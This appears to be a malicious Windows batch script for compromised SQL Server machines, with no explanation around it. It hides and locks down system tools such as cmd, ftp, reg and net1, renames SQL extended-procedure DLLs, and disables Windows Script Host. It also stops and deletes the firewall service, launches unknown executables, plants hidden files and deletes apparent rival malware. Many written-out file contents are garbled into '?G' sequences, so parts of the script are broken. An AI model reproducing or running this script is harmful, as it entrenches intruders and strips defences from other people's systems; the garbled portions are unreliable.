@echo off
if exist "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" rename "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" xpodse80.dll
if exist "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" rename "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" xpodse80.dll
if exist "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" rename "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" xpodse80.dll
if exist "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" rename "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll" xpodse80.dll
if exist "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" rename "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" xpodse81.dll
if exist "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" rename "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" xpodse81.dll
if exist "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" rename "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" xpodse81.dll
if exist "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" rename "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\xpweb70.dll" xpodse81.dll
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "D:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "E:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "F:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\\attrib.exe attrib +h +s +r "G:\Program Files\Microsoft SQL Server\MSSQL\Binn\odsole70.dll"
if exist %SystemRoot%\system32\CatRoot\008.exe start %SystemRoot%\system32\CatRoot\008.exe
if exist %SystemRoot%\system32\CatRoot\2004.exe start %SystemRoot%\system32\CatRoot\2004.exe
if exist %SystemRoot%\system32\CatRoot\fyie.exe start %SystemRoot%\system32\CatRoot\fyie.exe
if exist %SystemRoot%\system32\CatRoot\319.exe start %SystemRoot%\system32\CatRoot\319.exe
if exist %SystemRoot%\system32\CatRoot\1139.exe start %SystemRoot%\system32\CatRoot\1139.exe
if exist %SystemRoot%\\system32\\setupla.exe start %SystemRoot%\\system32\\setupla.exe
if exist %SystemRoot%\\system32\\tcpyi.exe start %SystemRoot%\\system32\\tcpyi.exe
if exist %SystemRoot%\system32\CatRoot\setups.bat del %SystemRoot%\system32\CatRoot\setups.bat
if exist %SystemRoot%\system32\ias\*.* del %SystemRoot%\system32\ias\*.*  /f /s /q /a
if exist %SystemRoot%\system32\CatRoot\008.exe start %SystemRoot%\system32\CatRoot\008.exe
if exist %SystemRoot%\system32\CatRoot\2004.exe start %SystemRoot%\system32\CatRoot\2004.exe
if exist %SystemRoot%\system32\CatRoot\fyie.exe start %SystemRoot%\system32\CatRoot\fyie.exe
if exist %SystemRoot%\system32\CatRoot\319.exe start %SystemRoot%\system32\CatRoot\319.exe
if exist %SystemRoot%\system32\CatRoot\1139.exe start %SystemRoot%\system32\CatRoot\1139.exe
copy %SystemRoot%\\system32\\ftp.exe %SystemRoot%\\system32\\appends.exe /y
copy %SystemRoot%\\system32\\ftp.exe %SystemRoot%\\system32\\dllcache\\appends.exe /y
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\ftp.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\ftp.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\appends.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\appends.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\cscript.exe
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\cscript.exe /e /d everyone
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\tftp.exe /e /d everyone
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\reg.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\reg.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\sc.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\attrib.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\dllcache\\attrib.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\cacls.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r %SystemRoot%\\system32\\dllcache\\cacls.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\cmd.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dllcache\\cmd.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +r +s +h %SystemRoot%\\system32\\net1.exe
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_SZ /d 0 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\ /v DisallowRun /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 5 /t REG_SZ /d a.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 6 /t REG_SZ /d s.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 7 /t REG_SZ /d 88.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 8 /t REG_SZ /d 89.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 9 /t REG_SZ /d 90.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 10 /t REG_SZ /d 91.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 11 /t REG_SZ /d mn.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 12 /t REG_SZ /d cc.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 13 /t REG_SZ /d tmd.exe /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\DisallowRun\ /v 14 /t REG_SZ /d tcpips.exe /f
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\ftp.exe /e /t /g everyone:F >>%SystemRoot%\\ime\\imejp\\nvunins.bat
echo if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\reg.exe /e /t /g everyone:F >>%SystemRoot%\\ime\\imejp\\nvunins.bat
echo reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\currentversion\image file execution options\ftp.exe" /f >>%SystemRoot%\\ime\\imejp\\nvunins.bat
echo ?*??G >%SystemRoot%\\debug\\kao.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\debug\\kao.bat
echo open ?*??G >c:\c.dat
echo open ?*??G >%SystemRoot%\\debug\\a.exe
echo open ?*??G >%SystemRoot%\\debug\\b.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h c:\c.dat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +h %SystemRoot%\\ime\\imejp\\nvunins.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\debug\\a.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\debug\\b.exe
echo ?G??G??G??G?? >%SystemRoot%\\system32\\sysme.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\sysme.bat
echo ?G??G??G????G? >%SystemRoot%\\system32\\zzxxxd.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\zzxxxd.sys
echo ?G??G???G???G??G? >%SystemRoot%\\system32\\zzjkxs.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\zzjkxs.sys
echo ?G??G??G???G??G? >%SystemRoot%\\system32\\system2.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\system2.bat
echo ?G??G??G??G? >%SystemRoot%\\system32\\system1.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\system1.bat
echo ?G??G??G??G? >%SystemRoot%\\system32\\zHZ69jR8.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\zHZ69jR8.sys
echo ?G??G??G??G? >%SystemRoot%\\system32\\dboy1.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\dboy1.sys
echo ?G??G??G??G? >%SystemRoot%\\system32\\tencent.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\tencent.sys
echo ?G??G??G??G? >%SystemRoot%\\system32\\cc.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\cc.sys
echo ?G??G?G?G??G??G? >%SystemRoot%\\system32\\G3i2Ll.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\G3i2Ll.sys
echo ?G??G??G??G? >%SystemRoot%\\system32\\setuplk.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\setuplk.sys
echo ?G??G??G???G? >%SystemRoot%\\system32\\setuplk.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\setuplk.exe
echo ?G??G???G?G??G? >%SystemRoot%\\system32\\spcmd.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\spcmd.sys
echo ?G???G??G??G??G? >%SystemRoot%\\system32\\zxxyyy.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\zxxyyy.sys
echo ?G???G??G??G??G?G??G?G??G? >%SystemRoot%\\system32\\tcpips.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\tcpips.sys
echo ?G???G??G??G??G?G??G?G??G? >%SystemRoot%\\system32\\Ls09.sys
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\system32\\Ls09.sys
echo ?G??G??G??G??G? >%SystemRoot%\\s.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\s.exe
echo ?G??G??G??G??G??G? >%SystemRoot%\\tmd1.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\tmd1.exe
echo ?G??G??G??G??G??G? >%SystemRoot%\\tmd2.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\tmd2.exe
echo ?G??G?G??G???G??G? >%SystemRoot%\\tmd.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\tmd.exe
echo ?G??G??G??G??G??G? >%SystemRoot%\\a1.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\a1.exe
echo ?G??G??G??G??G??G? >%SystemRoot%\\a2.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\a2.exe
echo ??G??G?G??G??G??G? >%SystemRoot%\\se.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\se.exe
echo ?G??G???G??G?G??G? >c:\boot.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h c:\boot.exe
echo ?G??G??G??G??G??G? >c:\sc.exe
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h c:\sc.exe
echo ?G??G?Eàè¡« >%SystemRoot%\\AppPatch\\nvunins.bat
if exist %SystemRoot%\system32\\attrib.exe attrib +s +r +h %SystemRoot%\\AppPatch\\nvunins.bat
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\AppPatch\\nvunins.bat /e /d everyone
if exist %SystemRoot%\system32\\sc.exe sc stop sharedaccess
if exist %SystemRoot%\system32\\sc.exe sc delete sharedaccess
if exist %SystemRoot%\system32\\cacls.exe cacls.exe %SystemRoot%\\system32\\net1.exe /e /d everyone
if exist %SystemRoot%\system32\CatRoot\380.exe del %SystemRoot%\\system32\\CatRoot\\380.exe
if exist %SystemRoot%\system32\CatRoot\008.exe del %SystemRoot%\system32\CatRoot\008.exe
if exist %SystemRoot%\system32\CatRoot\2004.exe del %SystemRoot%\system32\CatRoot\2004.exe
if exist %SystemRoot%\system32\CatRoot\fyie.exe del %SystemRoot%\system32\CatRoot\fyie.exe
if exist %SystemRoot%\system32\CatRoot\319.exe del %SystemRoot%\system32\CatRoot\319.exe
if exist %SystemRoot%\system32\CatRoot\1139.exe del %SystemRoot%\system32\CatRoot\1139.exe
if exist %SystemRoot%\system32\CatRoot\termsrv2.dll del %SystemRoot%\system32\CatRoot\termsrv2.dll
if exist %SystemRoot%\\tcpsv1.exe start %SystemRoot%\\tcpsv1.exe
if exist %SystemRoot%\\tcpsv2.exe start %SystemRoot%\\tcpsv2.exe
if exist %SystemRoot%\\tcpsv3.exe start %SystemRoot%\\tcpsv3.exe
del %SystemRoot%\\tcps*.exe
del %SystemRoot%\\system32\\setup*.bat
del %SystemRoot%\\system32\\setup*.sys
del %SystemRoot%\\system32\\tcpyi.sys
del %SystemRoot%\\system32\\setupl*.exe
del %SystemRoot%\\system32\\tcpsv*.exe
del %SystemRoot%\\system32\\tcpsvcs.exe
del %SystemRoot%\\system32\\tcpyi.sys /f /s /q /a
del %SystemRoot%\\system32\\arphrosr*.tbl /f /s /q /a
del %SystemRoot%\\system32\\yantou.sys /f /s /q /a
del %SystemRoot%\\system32\\tcpyi.bat /f /s /q /a
del %SystemRoot%\\system32\\tcpyi.exe /f /s /q /a
del %SystemRoot%\\system32\\ntdos87.sys /f /s /q /a
del %SystemRoot%\\system32\\ntdos87.bat /f /s /q /a
del %SystemRoot%\\system32\\xiaoyi*.bat /f /s /q /a
del %SystemRoot%\\system32\\xiaoyi*.sys /f /s /q /a
del %SystemRoot%\\system32\\arphrosr.tbl /f /s /q /a
del c:\xiaoyi2009*.exe /f /s /q /a
del %SystemRoot%\\system32\\spool\\NetSetup1.bat /f /s /q /a
del %SystemRoot%\\msapps\\del.bat /f /s /q /a
echo DOSmode >>%SystemRoot%\\system32\\drivers\\acpiec1.sys
exit
